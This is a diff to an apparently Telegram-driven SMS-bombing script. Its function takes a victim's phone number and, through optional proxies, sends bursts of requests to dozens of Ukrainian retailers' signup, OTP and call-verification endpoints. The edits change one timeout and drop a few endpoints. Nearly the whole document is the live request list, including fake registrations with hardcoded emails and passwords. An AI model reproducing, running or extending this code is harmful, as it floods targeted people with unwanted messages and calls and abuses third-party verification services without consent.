@@ -1265,8 +1265,8 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
             if not attack_flags.get(chat_id):
                 return
             
-            # Для smaki-maki використовуємо більший таймаут (15 секунд)
-            timeout_seconds = 15 if 'smaki-maki.com' in url else 5
+            # Для smaki-maki використовуємо більший таймаут (30 секунд)
+            timeout_seconds = 30 if 'smaki-maki.com' in url else 5
             timeout = aiohttp.ClientTimeout(total=timeout_seconds)
             async with aiohttp.ClientSession(timeout=timeout) as session:
                 method = kwargs.pop('method', 'POST')
@@ -1321,16 +1321,13 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
         bounded_request("https://pizza-time.eatery.club/site/v1/pre-login", **with_proxy({"json": {"phone": number}, "headers": headers})),
         bounded_request("https://iq-pizza.eatery.club/site/v1/pre-login", **with_proxy({"json": {"phone": number}, "headers": headers})),
         bounded_request("https://dnipro-m.ua/ru/phone-verification/", **with_proxy({"json": {"phone": number}, "headers": headers_dnipro, "cookies": cookies_dnipro})),
-        bounded_request("https://my.ctrs.com.ua/api/v2/signup", **with_proxy({"json": {"email": "finn889ik@gmail.com", "name": "Денис", "phone": number}, "headers": headers_citrus, "cookies": cookies_citrus})),
         bounded_request("https://my.ctrs.com.ua/api/auth/login", **with_proxy({"json": {"identity": "+" + number}, "headers": headers_citrus, "cookies": cookies_citrus})),
         bounded_request("https://auth.easypay.ua/api/check", **with_proxy({"json": {"phone": number}, "headers": headers_easypay})),
         bounded_request("https://sandalini.ua/ru/signup/", **with_proxy({"data": {"data[firstname]": "деня", "data[phone]": formatted_number2, "wa_json_mode": "1", "need_redirects  ": "1", "contact_type": "person"}, "headers": headers})),
         bounded_request("https://uvape.pro/index.php?route=account/register/add", **with_proxy({"data": {"firstname": "деня", "telephone": formatted_number3, "email": "random@gmail.com", "password": "VHHsq6b#v.q>]Fk"}, "headers": headers_uvape, "cookies": cookies_uvape})),
-        bounded_request("https://vandalvape.life/index.php?route=extension/module/sms_reg/SmsCheck", **with_proxy({"data": {"phone": formatted_number4}, "headers": headers})),
         bounded_request("https://vandalvape.life/index.php?route=extension/module/sms_reg/SmsCheck", **with_proxy({"data": {"phone": formatted_number4, "only_sms": "1"}, "headers": headers})),
         bounded_request("https://terra-vape.com.ua/index.php?route=common/modal_register/register_validate", **with_proxy({"data": {"firstname": "деня", "lastname": "деневич", "email": "randi@gmail.com", "telephone": number, "password": "password24-", "smscode": "", "step": "first_step"}, "headers": headers_terravape, "cookies": cookies_terravape})),
         bounded_request("https://im.comfy.ua/api/auth/v3/otp/send", **with_proxy({"json": {"phone": number}, "headers": headers})),
-        bounded_request("https://im.comfy.ua/api/auth/v3/ivr/send", **with_proxy({"json": {"phone": number}, "headers": headers})),
         bounded_request("https://www.moyo.ua/identity/registration", **with_proxy({"data": {"firstname": "деня", "phone": formatted_number5, "email": "rando@gmail.com"}, "headers": headers_moyo, "cookies": cookies_moyo})),
         bounded_request("https://pizza.od.ua/ajax/reg.php", **with_proxy({"data": {"phone": formatted_number4}, "headers": headers})),
         bounded_request("https://sushiya.ua/ru/api/v1/user/auth", **with_proxy({"data": {"phone": number[2:], "need_skeep": ""}, "headers": headers_sushiya})),
@@ -1348,7 +1345,6 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
         bounded_request("https://dracula.robota.ua/?q=SendOtpCode", **with_proxy({"json": {"operationName": "SendOtpCode", "query": "mutation SendOtpCode($phone: String!) {  users {    login {      otpLogin {        sendConfirmation(phone: $phone) {          status          remainingAttempts          __typename        }        __typename      }      __typename    }    __typename  }}", "variables": {"phone": number}}, "headers": headers})),
         bounded_request(f"https://shop.kyivstar.ua/api/v2/otp_login/send/{number[2:]}", **with_proxy({"method": 'GET', "headers": headers})),
         bounded_request("https://elmir.ua/response/load_json.php?type=validate_phone", **with_proxy({"data": {"fields[phone]": "+" + number, "fields[call_from]": "register", "fields[sms_code]": "", "action": "code"}, "headers": headers_elmir, "cookies": cookies_elmir})),
-        bounded_request("https://elmir.ua/response/load_json.php?type=validate_phone", **with_proxy({"data": {"fields[phone]": "+" + number, "fields[call_from]": "register", "fields[sms_code]": "", "action": "call"}, "headers": headers_elmir_call, "cookies": cookies_elmir_call})),
         bounded_request(f"https://bars.itbi.com.ua/smart-cards-api/common/users/otp?lang=uk&phone={number}", **with_proxy({"method": 'GET', "headers": headers})),
         bounded_request("https://api.kolomarket.abmloyalty.app/v2.1/client/registration", **with_proxy({"json": {"phone": number, "password": "!EsRP2S-$s?DjT@", "token": "null"}, "headers": headers})),
     ]
